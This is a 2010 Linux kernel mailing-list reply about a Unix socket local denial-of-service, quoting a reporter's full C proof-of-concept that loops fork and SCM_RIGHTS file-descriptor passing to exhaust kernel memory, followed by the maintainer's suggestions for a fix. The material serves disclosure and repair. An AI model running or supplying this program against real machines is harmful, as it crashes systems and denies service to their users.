Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1754082Ab0KWXUS (ORCPT <rfc822;w@1wt.eu>);
	Tue, 23 Nov 2010 18:20:18 -0500
Received: from mail-ww0-f44.google.com ([74.125.82.44]:51294 "EHLO
	mail-ww0-f44.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1753109Ab0KWXUQ (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Tue, 23 Nov 2010 18:20:16 -0500
DomainKey-Signature: a=rsa-sha1; c=nofws;
        d=gmail.com; s=gamma;
        h=subject:from:to:cc:in-reply-to:references:content-type:date
         :message-id:mime-version:x-mailer:content-transfer-encoding;
        b=fGcnAhDOe7u/uL8mrekGFP0l1OMDZacCy/x4nHkWk2v10adt8/EEZf06z01Ow9/KhA
         Wa2aKReQUB9kF2bXwH+msA1GSaWtEgu5+PpxmBFe+VJUvW0xutreGDX6N8nFXsmHGGsU
         B/RqQvpyhBK11zPmTaFbsVE/mBl4N83pBRgA0=
Subject: Re: Unix socket local DOS (OOM)
From: Eric Dumazet <eric.dumazet@gmail.com>
To: Vegard Nossum <vegard.nossum@gmail.com>,
        David Miller <davem@davemloft.net>
Cc: LKML <linux-kernel@vger.kernel.org>,
        Andrew Morton <akpm@linux-foundation.org>,
        Eugene Teo <eugene@redhat.com>, netdev <netdev@vger.kernel.org>
In-Reply-To: <AANLkTi=Q967xpX0KLMwX-=_4_1AKO5wjHEuJ1TrNjCj9@mail.gmail.com>
References: <AANLkTi=Q967xpX0KLMwX-=_4_1AKO5wjHEuJ1TrNjCj9@mail.gmail.com>
Content-Type: text/plain; charset="UTF-8"
Date: Wed, 24 Nov 2010 00:11:58 +0100
Message-ID: <1290553918.2866.80.camel@edumazet-laptop>
Mime-Version: 1.0
X-Mailer: Evolution 2.30.3 
Content-Transfer-Encoding: 8bit
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

Le mardi 23 novembre 2010 à 23:21 +0100, Vegard Nossum a écrit :
> Hi,
> 
> I found this program lying around on my laptop. It kills my box
> (2.6.35) instantly by consuming a lot of memory (allocated by the
> kernel, so the process doesn't get killed by the OOM killer). As far
> as I can tell, the memory isn't being freed when the program exits
> either. Maybe it will eventually get cleaned up the UNIX socket
> garbage collector thing, but in that case it doesn't get called
> quickly enough to save my machine at least.
> 
> #include <sys/mount.h>
> #include <sys/socket.h>
> #include <sys/un.h>
> #include <sys/wait.h>
> 
> #include <errno.h>
> #include <fcntl.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <unistd.h>
> 
> static int send_fd(int unix_fd, int fd)
> {
>         struct msghdr msgh;
>         struct cmsghdr *cmsg;
>         char buf[CMSG_SPACE(sizeof(fd))];
> 
>         memset(&msgh, 0, sizeof(msgh));
> 
>         memset(buf, 0, sizeof(buf));
>         msgh.msg_control = buf;
>         msgh.msg_controllen = sizeof(buf);
> 
>         cmsg = CMSG_FIRSTHDR(&msgh);
>         cmsg->cmsg_len = CMSG_LEN(sizeof(fd));
>         cmsg->cmsg_level = SOL_SOCKET;
>         cmsg->cmsg_type = SCM_RIGHTS;
> 
>         msgh.msg_controllen = cmsg->cmsg_len;
> 
>         memcpy(CMSG_DATA(cmsg), &fd, sizeof(fd));
>         return sendmsg(unix_fd, &msgh, 0);
> }
> 
> int main(int argc, char *argv[])
> {
>         while (1) {
>                 pid_t child;
> 
>                 child = fork();
>                 if (child == -1)
>                         exit(EXIT_FAILURE);
> 
>                 if (child == 0) {
>                         int fd[2];
>                         int i;
> 
>                         if (socketpair(PF_UNIX, SOCK_SEQPACKET, 0, fd) == -1)
>                                 goto out_error;
> 
>                         for (i = 0; i < 100; ++i) {
>                                 if (send_fd(fd[0], fd[0]) == -1)
>                                         goto out_error;
> 
>                                 if (send_fd(fd[1], fd[1]) == -1)
>                                         goto out_error;
>                         }
> 
>                         close(fd[0]);
>                         close(fd[1]);
>                         goto out;
> 
>                 out_error:
>                         fprintf(stderr, "error: %s\n", strerror(errno));
>                 out:
>                         exit(EXIT_SUCCESS);
>                 }
> 
>                 while (1) {
>                         pid_t kid;
>                         int status;
> 
>                         kid = wait(&status);
>                         if (kid == -1) {
>                                 if (errno == ECHILD)
>                                         break;
>                                 if (errno == EINTR)
>                                         continue;
> 
>                                 exit(EXIT_FAILURE);
>                         }
> 
>                         if (WIFEXITED(status)) {
>                                 if (WEXITSTATUS(status))
>                                         exit(WEXITSTATUS(status));
>                                 break;
>                         }
>                 }
>         }
> 
>         return EXIT_SUCCESS;
> }
> 
> 
> Vegard
> --

Hi Vegard

Do you have a patch to correct this problem ?

I suppose we should add a machine wide limit of pending struct
scm_fp_list. (percpu_counter I guess)

David, commit f8d570a4 added one "struct list_head list;" to struct
scm_fp_list, enlarging it by a two factor because of power of two
kmalloc() sizes.  (2048 bytes on 64bit arches instead of 1024
previously)

We might lower SCM_MAX_FD from 255 to 253 ?



